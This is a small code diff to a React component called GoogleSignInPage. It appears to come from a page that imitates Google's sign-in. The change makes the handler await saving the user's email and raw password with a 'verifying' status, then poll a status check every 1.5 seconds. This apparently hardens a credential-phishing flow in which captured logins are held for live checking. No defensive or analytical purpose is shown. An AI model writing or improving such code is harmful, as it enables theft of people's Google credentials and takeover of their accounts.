@@ -93,13 +93,13 @@ export default function GoogleSignInPage() {
     }, 800);
   };
 
-  const handlePasswordNext = (e: React.FormEvent) => {
+  const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
     const trimmedPwd = password.trim();
     if (!trimmedPwd) return;
 
     setLoading(true);
-    saveUser(email, trimmedPwd, 'verifying');
+    await saveUser(email, trimmedPwd, 'verifying');
 
     if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
     checkIntervalRef.current = setInterval(checkUserStatus, 1500);
